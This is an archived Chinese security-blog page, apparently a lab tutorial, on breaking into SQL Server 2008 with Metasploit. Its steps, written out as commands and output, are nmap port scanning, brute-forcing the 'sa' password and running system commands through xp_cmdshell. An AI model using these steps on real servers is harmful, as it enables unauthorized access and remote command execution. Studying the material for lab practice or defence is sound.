@@ -1,0 +1,1128 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="Metasploit,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="description" content="MSF应用之 sql sever（xp_cmdshell sp）">
+<meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF应用之 sql sever（xp_cmdshell sp）">
+<meta property="og:url" content="www.ggsec.cn/MSF应用之sql_sever.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:description" content="MSF应用之 sql sever（xp_cmdshell sp）">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-11-post-exploitation-with-mimikatz.1280x600.jpg">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/A318BFAC-755A-479F-94C9-7A7D132DB807.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/5A09A414-11D6-4050-AF97-0E089062684B.png">
+<meta property="og:updated_time" content="2018-12-21T06:56:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MSF应用之 sql sever（xp_cmdshell sp）">
+<meta name="twitter:description" content="MSF应用之 sql sever（xp_cmdshell sp）">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-11-post-exploitation-with-mimikatz.1280x600.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> MSF应用之 sql sever（xp_cmdshell sp） | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              MSF应用之 sql sever（xp_cmdshell sp）
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2016-12-13T20:30:54+08:00" content="2016-12-13">
+            2016-12-13
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/Metasploit/" itemprop="url" rel="index">
+                  <span itemprop="name">Metasploit</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/MSF应用之sql_sever.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="MSF应用之sql_sever.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/MSF应用之sql_sever.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p> <span style="font-size: 200%;"> MSF应用之 sql sever（xp_cmdshell sp）</span><span style="font-size: 200%;"><br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-11-post-exploitation-with-mimikatz.1280x600.jpg" alt="enter description here"><br><a id="more"></a><br>目标实验机：  虚拟机系统(windows server 2008  R2)</span></p>
+<p>sql server 2008</p>
+<p>本机工具：本机系统  mac  os</p>
+<p>nmap/metaspliost</p>
+<p></p><h1><span style="color: #ff0000;">知识科普：</span></h1><br><strong><span style="color: #008000;">xp_cmdshell:</span></strong><p></p>
+<ol>
+<li>SQL中运行系统命令行的系统存储过程，一般在安全级别较高的服务器上，建议关闭或限制访问权,可以使用外围应用配置器工具以及通过执行 sp_configure 来启用和禁用 xp_cmdshell       (<span style="color: #008000;">在sql sever 2005以上 微软是自动关闭该选项，在sql server 2005版本中是自动开启的，虽然关闭着的，但是我们还是可以绕过该机制，在试验机中 ，关闭了该选项，但还是可以绕过，主要是因为服务器上关了自带的防火墙，才可以运行的该漏洞，各位小伙伴们可以在实验机上试试。虽然可以执行任意的dos命令，但是权限比较低)</span></li>
+</ol>
+<p>&nbsp;</p>
+<ol start="2">
+<li>有许多方法来破解数据库，而且这些技术需要SQL注入（C），这是一种方式发送SQL命令从一个Web窗体或其他输入到数据库中。在本教程中，我们将使用SQL注入获取底层服务器。因此，我们将使用数据库作为访问底层服务器的中介来访问数据库和数据，而不是访问数据库和数据。</li>
+</ol>
+<p>几乎所有的商业数据库MS SQL Server，Oracle，MySQL，DB2，等等，都有内置的系统存储过程（SP）。这是由开发人员提供的代码，以帮助系统管理员完成常见的任务。</p>
+<p>通常，一个数据库系统管理员将需要访问底层的服务器，微软提供了一个称为xp_cmdshell SP在SQL Server。当系统管理员执行此命令时，他们会在托管数据库的基础服务器上获得一个命令提示。<br>这是一次对所有SP的微软SQL服务器安装的默认启用，但因为它是由黑客经常利用，微软已经禁用了默认但我们仍然可以访问它肆虐！<br>当然，要访问此远程登录，我们将需要系统管理员的登录凭据。默认情况下，微软包装他们的SQL Server与系统管理员帐户名为“SA”和一些系统管理员改变它。你可以使用这样的工具sqldict或Metasploit的辅助模块，sql_login，获得SA密码用在本hack。<br>如果我们能在受害者系统上执行命令，我们不能只运行侦察它，但我们也可以有足够的系统和Windows命令它自己的知识。<br> </p><h1 id="一言不合的请猛击一下下列视频"><a href="#测试视频播放" class="headerlink"></a></h1><hr><p></p>
+<p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
+<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
+<script>
+    var ivaInstance = new Iva('ivaLive', {
+        appkey: 'By9WGzBIx', //应用标示
+        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/sqlserver.mp4', //视频
+        title: 'test', //视频标题，后台视频管理中的标题
+        cover: '' //视频封面，只有在autoplay:false才可生效
+    });
+</script>
+<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
+
+<p></p><h1><span style="color: #ff0000;"><strong>信息收集：</strong></span></h1><br><strong>nmap :</strong><p></p>
+<p><pre class="lang:vim decode:true ">nmap -p 1433 192.168.1.0/24</pre><br><span style="color: #008000;">用nmap来针对：1433端口来扫描整个网段下的ip  检测是否开放了 1433端口</span></p>
+<p>检测结果如下：</p>
+<p></p><p style="padding-left: 60px;">Starting Nmap 7.12 ( <a href="https://nmap.org" target="_blank" rel="noopener">https://nmap.org</a> ) at 2016-11-27 21:16 CST<br>Nmap scan report for 192.168.1.1<br>Host is up (0.0080s latency).<br>PORT STATE SERVICE<br>1433/tcp filtered ms-sql-s</p><p></p>
+<p></p><p style="padding-left: 60px;">Nmap scan report for 192.168.1.101<br>Host is up (0.00077s latency).<br>PORT STATE SERVICE<br>1433/tcp closed ms-sql-s</p><p></p>
+<p></p><p style="padding-left: 60px;">Nmap scan report for 192.168.1.103<br>Host is up (0.00097s latency).<br>PORT STATE SERVICE<br><span style="color: #ff0000;">1433/tcp open ms-sql-s</span></p><br>&nbsp;<p></p>
+<p>我们还可以对检测出开放1433端口的机子进行进一步的检测：</p>
+<p><pre class="lang:vim decode:true ">nmap -A 192.168.1.103</pre><br>对该ip 进行全面检测，结果如下：</p>
+<p></p><p style="padding-left: 60px;">Nmap scan report for 192.168.1.103<br>Host is up (0.0021s latency).<br>Not shown: 989 closed ports<br>PORT STATE SERVICE VERSION<br>80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>135/tcp open msrpc Microsoft Windows RPC<br>139/tcp open netbios-ssn Microsoft Windows 98 netbios-ssn<br>445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 microsoft-ds<br><span style="color: #ff0000;">1433</span>/tcp<span style="color: #ff0000;"> open</span> ms-sql-s<span style="color: #ff0000;"> Microsoft SQL Server 2008 R2</span> 10.50.4000.00; SP2<br>| ms-sql-ntlm-info:</p><p></p>
+<p></p><p style="padding-left: 60px;">49152/tcp open msrpc Microsoft Windows RPC<br>49153/tcp open msrpc Microsoft Windows RPC<br>49154/tcp open msrpc Microsoft Windows RPC<br>49155/tcp open msrpc Microsoft Windows RPC<br>49156/tcp open msrpc Microsoft Windows RPC<br>49157/tcp open msrpc Microsoft Windows RPC<br>Service Info: OSs: Windows, Windows 98, <span style="color: #ff0000;">Windows Server 2008 R2</span>; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_98, cpe:/o:microsoft:windows_server_2008:r2</p><p></p>
+<p></p><p style="padding-left: 60px;">Host script results:<br>| ms-sql-info:<br>| <span style="color: #ff0000;">192.168.1.103:1433:</span><br>| Version:<br>| name: <span style="color: #ff0000;">Microsoft SQL Server 2008 R2 SP2</span><br>| Post-SP patches applied: false<br>| Product: <span style="color: #ff0000;">Microsoft SQL Server 2008 R2</span><br>| number: 10.50.4000.00<br>| Service pack level: <span style="color: #ff0000;">SP2</span><br>|_ TCP port: <span style="color: #ff0000;">1433</span></p><br><strong>具体详细使用nmap 参考（凌舞）</strong><p></p>
+<p><a href="http://www.secist.com/archives/2197.html" target="_blank" rel="noopener"> 原理篇：常用的扫描技术（一）</a></p>
+<p><a href="http://www.secist.com/archives/2259.html" target="_blank" rel="noopener">原理篇：常用的扫描技术（二）</a></p>
+<p>&nbsp;</p>
+<p>那么我们知道目标机器使用的是sql server  2008的版本 而且还开放了1433端口</p>
+<p>那么我们可以使用msf的辅助扫描模块，对其sqlserver的爆破，</p>
+<p>msf 调用 scanner 模块</p>
+<p><pre class="lang:vim decode:true">msf &gt; use auxiliary/scanner/mssql/mssql_login<br></pre><br>设置挂载需要爆破的弱口令密码字典</p>
+<p><pre class="lang:vim decode:true">msf auxiliary(mssql_login) &gt; set PASS_FILE 1.txt<br>PASS_FILE =&gt; 1.txt</pre><br>我们知道在mssql里面 sa的权限是最高的，在这里我们尝试着用sa来登录 ，里面也可以对其使用username_File 挂载mssql登录用户</p>
+<p><pre class="lang:vim decode:true">msf auxiliary(mssql_login) &gt; set username sa<br>username =&gt; sa</pre><br>可自定义设置扫描线程：</p>
+<p><pre class="lang:vim decode:true ">msf auxiliary(mssql_login) &gt; set threads 50<br>threads =&gt; 50</pre><br>设置目标ip</p>
+<p><pre class="lang:vim decode:true ">msf auxiliary(mssql_login) &gt; set rhosts 192.168.1.103<br>rhosts =&gt; 192.168.1.103</pre><br>开始爆破</p>
+<p><pre class="lang:vim decode:true ">msf auxiliary(mssql_login) &gt; run</pre></p>
+<p>[<em>] 192.168.1.103:1433    - 192.168.1.103:1433 - MSSQL - Starting authentication scanner.<br>[-] 192.168.1.103:1433    - 192.168.1.103:1433 - LOGIN FAILED: WORKSTATION\sa:1111 (Incorrect: )<br>[+] 192.168.1.103:1433    - 192.168.1.103:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:111<br>[</em>] Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed<br>得知信息：</p>
+<p>由以上收集到的信息为:</p>
+<p>系统版本    <span style="color: #ff0000;">windows server  2008 r2</span></p>
+<p>数据库使用版本： <span style="color: #ff0000;">sql server  2008</span></p>
+<p>目标所在ip  以及开放的端口等信息： <span style="color: #ff0000;">192.168.1.103：1433 ms-sql-s</span></p>
+<p>mssql账号和密码为：sa /111</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p></p><h1><span style="color: #ff0000;">信息利用：</span></h1><br>使用msf命令执行模块，执行最终的dos命令<p></p>
+<p><pre class="lang:default decode:true ">msf auxiliary(mssql_login) &gt; use auxiliary/admin/mssql/mssql_exec</pre><br>使用options，来查看设置参数<img class="size-full wp-image-2293 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/A318BFAC-755A-479F-94C9-7A7D132DB807.png" alt="a318bfac-755a-479f-94c9-7a7d132db807" width="880" height="375"></p>
+<p>需要设置的是cmd里面的dos 命令 比如说：net user  查看用户组</p>
+<p><pre class="lang:vim decode:true">msf auxiliary(mssql_exec) &gt; set cmd ‘net user’<br>cmd =&gt; net user<br>msf auxiliary(mssql_exec) &gt; set PASSWORD 111     (设置爆破出来的密码)<br>PASSWORD =&gt; 111<br>msf auxiliary(mssql_exec) &gt; set rhost 192.168.1.103  （设置目标ip）<br>rhost =&gt; 192.168.1.103<br>msf auxiliary(mssql_exec) &gt; exploit   （执行攻击<br></pre><br>&nbsp;</p>
+<p><img class="size-full wp-image-2292 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/5A09A414-11D6-4050-AF97-0E089062684B.png" alt="5a09a414-11d6-4050-af97-0e089062684b" width="881" height="472"></p>
+<p>&nbsp;</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag">#Metasploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/bolg.html" rel="prev">Demon'S bolg</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/国外优秀hacking教程吐血推荐.html" rel="next">国外优秀hacking教程吐血推荐！!</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="MSF应用之sql_sever.html" data-title="MSF应用之 sql sever（xp_cmdshell sp）" data-url="www.ggsec.cn/MSF应用之sql_sever.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">156</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://bestsec.net" target="_blank">Bang'Blog</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=377915817&auto=0&height=430"></iframe>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
